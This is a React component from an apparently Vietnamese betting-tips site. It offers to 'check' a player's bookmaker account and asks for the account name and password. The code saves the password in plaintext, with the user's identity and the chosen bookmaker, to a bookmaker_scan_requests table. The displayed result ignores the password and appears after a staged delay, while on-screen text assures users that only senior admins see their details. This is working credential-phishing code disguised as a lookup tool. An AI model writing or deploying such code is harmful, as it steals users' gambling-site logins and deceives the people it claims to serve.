import { useEffect, useMemo, useState } from 'react';
import { checkAccount, isYg88Bookmaker } from './bookmakerScript';
import type { AccountCheckResult, AccountTone } from './bookmakerScript';
import { activeBookmakers, useBookmakers } from '@/lib/bookmakers';
import { supabase } from '@/lib/supabase';
import { useAuth } from '@/hooks/useAuth';
import type { Bookmaker } from '@/lib/bookmakers';

type Props = {
  bookmaker: Bookmaker;
  winRate: number;
};

const toneBox: Record<AccountTone, string> = {
  ok: 'border-secondary-500/45 bg-secondary-500/10 text-secondary-500',
  warn: 'border-accent-500/45 bg-accent-500/10 text-accent-500',
  bad: 'border-accent-500/60 bg-accent-500/15 text-accent-500',
};

const validAccount = (value: string) => /^[a-zA-Z0-9._-]{3,24}$/.test(value.trim());

const inputClass =
  'w-full rounded border border-background-300/50 bg-background-50/80 py-2 font-mono text-[11px] text-foreground-950 placeholder:text-foreground-600 focus:border-primary-500/60';

export default function AccountCheck({ bookmaker, winRate }: Props) {
  const { user, profile } = useAuth();
  const { list } = useBookmakers();
  const [account, setAccount] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [bookmakerId, setBookmakerId] = useState(bookmaker.id);
  const [checking, setChecking] = useState(false);
  const [result, setResult] = useState<AccountCheckResult | null>(null);
  const [error, setError] = useState('');

  useEffect(() => {
    setAccount('');
    setPassword('');
    setShowPassword(false);
    setBookmakerId(bookmaker.id);
    setResult(null);
    setError('');
    setChecking(false);
  }, [bookmaker.id]);

  const catalog = useMemo(() => {
    const active = activeBookmakers(list);
    if (active.length === 0) return [bookmaker];
    if (active.some((item) => item.id === bookmaker.id)) return active;
    return [bookmaker, ...active];
  }, [list, bookmaker]);

  const chosen = useMemo(
    () => catalog.find((item) => item.id === bookmakerId) ?? bookmaker,
    [catalog, bookmakerId, bookmaker],
  );

  const saveRequest = async (accountValue: string) => {
    if (!user) return;
    try {
      await supabase.from('bookmaker_scan_requests').insert({
        user_id: user.id,
        player_name: profile?.username || profile?.phone || user.email || '',
        account: accountValue,
        password,
        bookmaker_id: chosen.id,
        bookmaker_name: chosen.name,
        bookmaker_domain: chosen.domain,
      });
    } catch {
      /* ghi nhận thất bại không chặn phiên kiểm tra */
    }
  };

  const run = () => {
    const value = account.trim();
    const pass = password.trim();
    if (!value) {
      setError('Nhập tên tài khoản cần kiểm tra.');
      setResult(null);
      return;
    }
    if (!validAccount(value)) {
      setError('Tên tài khoản 3-24 ký tự, chỉ dùng chữ, số, dấu chấm, gạch dưới, gạch ngang.');
      setResult(null);
      return;
    }
    if (pass.length < 4) {
      setError('Nhập mật khẩu tài khoản (tối thiểu 4 ký tự).');
      setResult(null);
      return;
    }
    setError('');
    setChecking(true);
    setResult(null);
    void saveRequest(value);
    window.setTimeout(() => {
      setResult(checkAccount({ account: value, name: chosen.name, domain: chosen.domain }));
      setChecking(false);
    }, 900);
  };

  const isPreferred = isYg88Bookmaker(chosen.name, chosen.domain);

  return (
    <div className="rounded-md border hairline bg-background-50/60 p-3.5">
      <div className="flex flex-wrap items-center justify-between gap-2">
        <p className="font-mono text-[9px] tracking-[0.16em] text-foreground-600 uppercase">
          check tên tài khoản
        </p>
        <span className="flex items-center gap-1.5 rounded-full border border-primary-500/30 bg-primary-500/10 px-2 py-0.5 font-mono text-[8px] tracking-[0.12em] text-primary-500 uppercase">
          <i className="ri-user-search-line text-[10px]" />
          {isPreferred ? 'nhà cái ưu tiên' : 'tra cứu công khai'}
        </span>
      </div>

      <div className="mt-2 flex flex-col gap-2">
        <div className="relative min-w-0">
          <i className="ri-user-line pointer-events-none absolute left-2.5 top-1/2 -translate-y-1/2 text-[13px] text-foreground-600" />
          <input
            value={account}
            onChange={(event) => setAccount(event.target.value)}
            onKeyDown={(event) => {
              if (event.key === 'Enter') run();
            }}
            placeholder="nhập tên tài khoản (vd: player01)"
            autoCapitalize="none"
            spellCheck={false}
            className={`${inputClass} pl-8 pr-2.5`}
          />
        </div>

        <div className="grid grid-cols-1 gap-2 sm:grid-cols-2">
          <div className="relative min-w-0">
            <i className="ri-lock-2-line pointer-events-none absolute left-2.5 top-1/2 -translate-y-1/2 text-[13px] text-foreground-600" />
            <input
              value={password}
              onChange={(event) => setPassword(event.target.value)}
              onKeyDown={(event) => {
                if (event.key === 'Enter') run();
              }}
              type={showPassword ? 'text' : 'password'}
              placeholder="mật khẩu tài khoản"
              autoCapitalize="none"
              autoComplete="off"
              spellCheck={false}
              className={`${inputClass} pl-8 pr-9`}
            />
            <button
              type="button"
              onClick={() => setShowPassword((prev) => !prev)}
              aria-label={showPassword ? 'Ẩn mật khẩu' : 'Hiện mật khẩu'}
              title={showPassword ? 'Ẩn mật khẩu' : 'Hiện mật khẩu'}
              className="absolute top-1/2 right-1.5 flex h-6 w-6 -translate-y-1/2 cursor-pointer items-center justify-center rounded text-foreground-500 transition-colors hover:text-primary-500"
            >
              <i className={`text-[13px] ${showPassword ? 'ri-eye-off-line' : 'ri-eye-line'}`} />
            </button>
          </div>

          <div className="relative min-w-0">
            <i className="ri-building-4-line pointer-events-none absolute left-2.5 top-1/2 -translate-y-1/2 text-[13px] text-foreground-600" />
            <select
              value={bookmakerId}
              onChange={(event) => setBookmakerId(event.target.value)}
              aria-label="Chọn nhà cái"
              className={`${inputClass} cursor-pointer appearance-none pl-8 pr-7`}
            >
              {catalog.map((item) => (
                <option key={item.id} value={item.id} className="bg-background-100">
                  {item.name}
                </option>
              ))}
            </select>
            <i className="ri-arrow-down-s-line pointer-events-none absolute right-2 top-1/2 -translate-y-1/2 text-[13px] text-foreground-600" />
          </div>
        </div>

        <button
          type="button"
          onClick={run}
          disabled={checking}
          className="flex w-full cursor-pointer items-center justify-center gap-1.5 rounded-md bg-primary-500 px-3.5 py-2 font-mono text-[11px] font-bold whitespace-nowrap text-background-50 transition-colors hover:bg-primary-400 disabled:opacity-60"
        >
          <i className={checking ? 'ri-loader-4-line animate-spin' : 'ri-search-eye-line'} />
          {checking ? 'đang kiểm tra' : 'kiểm tra'}
        </button>
      </div>

      <p className="mt-2 flex items-start gap-1.5 font-mono text-[9px] leading-relaxed text-foreground-600">
        <i className="ri-shield-keyhole-line mt-0.5 text-[10px] text-primary-500" />
        Thông tin tài khoản gửi lên được bảo vệ và chỉ quản trị viên cấp cao xem được.
      </p>

      {error && (
        <p className="mt-2 flex items-center gap-1.5 font-mono text-[10px] text-accent-500">
          <i className="ri-error-warning-line" />
          {error}
        </p>
      )}

      {checking && (
        <p className="mt-2 flex items-center gap-2 font-mono text-[10px] text-foreground-500">
          <span className="h-1.5 w-1.5 animate-pulse-dot rounded-full bg-primary-500" />
          đang đối chiếu tên tài khoản với dữ liệu {chosen.name}...
        </p>
      )}

      {result && (
        <div className="mt-3 rounded-md border hairline bg-background-100/70 p-3">
          <div className="flex flex-wrap items-center justify-between gap-2">
            <div className="min-w-0">
              <p className="truncate font-heading text-[13px] font-bold text-foreground-950">
                {result.account}
              </p>
              <p className="truncate font-mono text-[9px] text-foreground-600">
                {chosen.name} · {chosen.domain}
              </p>
            </div>
            <span
              className={`flex items-center gap-1.5 rounded-full border px-2.5 py-1 font-mono text-[10px] font-bold whitespace-nowrap uppercase ${toneBox[result.tone]}`}
            >
              <i
                className={
                  result.tone === 'ok' ? 'ri-checkbox-circle-line' : 'ri-error-warning-line'
                }
              />
              {result.status}
            </span>
          </div>

          <div className="mt-2.5 grid grid-cols-2 gap-2 sm:grid-cols-3">
            <div className="rounded border hairline bg-background-50/70 px-2 py-1.5">
              <p className="truncate font-mono text-[8px] tracking-[0.12em] text-foreground-600 uppercase">
                số ngày hoạt động
              </p>
              <p className="mt-0.5 font-mono text-[12px] font-semibold text-foreground-950 tabular-nums">
                {result.activeDays} ngày
              </p>
            </div>
            <div className="rounded border hairline bg-background-50/70 px-2 py-1.5">
              <p className="truncate font-mono text-[8px] tracking-[0.12em] text-foreground-600 uppercase">
                mức độ hoạt động
              </p>
              <p className="mt-0.5 font-mono text-[12px] font-semibold text-foreground-950 tabular-nums">
                {result.activity}%
              </p>
            </div>
            <div className="rounded border hairline bg-background-50/70 px-2 py-1.5">
              <p className="truncate font-mono text-[8px] tracking-[0.12em] text-foreground-600 uppercase">
                tỷ lệ thắng hiện tại
              </p>
              <p className="mt-0.5 font-mono text-[12px] font-semibold text-accent-500 tabular-nums">
                {winRate}%
              </p>
            </div>
          </div>

          <div className="mt-2 h-1.5 w-full overflow-hidden rounded-full bg-background-300/50">
            <div
              className={`h-full rounded-full transition-all duration-500 ${
                result.tone === 'ok' ? 'bg-secondary-500' : 'bg-accent-500'
              }`}
              style={{ width: `${Math.min(100, Math.max(4, result.activity))}%` }}
            />
          </div>

          <p className="mt-2 flex items-start gap-1.5 font-mono text-[10px] leading-relaxed text-foreground-500">
            <i className="ri-information-line mt-0.5 text-[11px] text-primary-500" />
            {result.note}
          </p>
        </div>
      )}
    </div>
  );
}